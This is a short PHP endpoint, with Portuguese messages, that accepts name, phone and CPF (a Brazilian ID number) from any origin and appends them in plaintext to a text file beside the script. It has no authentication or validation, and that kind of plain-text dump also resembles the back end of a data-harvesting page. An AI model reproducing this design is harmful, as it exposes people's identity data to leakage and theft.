<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

error_reporting(0);
ini_set('display_errors', 0);

try {
    $json = file_get_contents('php://input');
    
    if (empty($json)) {
        throw new Exception('Nenhum dado recebido');
    }
    
    $data = json_decode($json, true);
    
    if (!$data || !isset($data['nome']) || !isset($data['telefone']) || !isset($data['cpf'])) {
        throw new Exception('Dados incompletos');
    }
    
    $nome = trim($data['nome']);
    $telefone = trim($data['telefone']);
    $cpf = trim($data['cpf']);
    
    $linha = date('d/m/Y H:i:s') . ' | ' . $nome . ' | ' . $telefone . ' | ' . $cpf . "\n";
    $arquivo = 'solicitacoes.txt';
    
    $resultado = file_put_contents($arquivo, $linha, FILE_APPEND | LOCK_EX);
    
    if ($resultado === false) {
        throw new Exception('Falha ao escrever no arquivo');
    }
    
    echo json_encode(['success' => true, 'message' => 'Dados salvos com sucesso']);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
exit;
?>
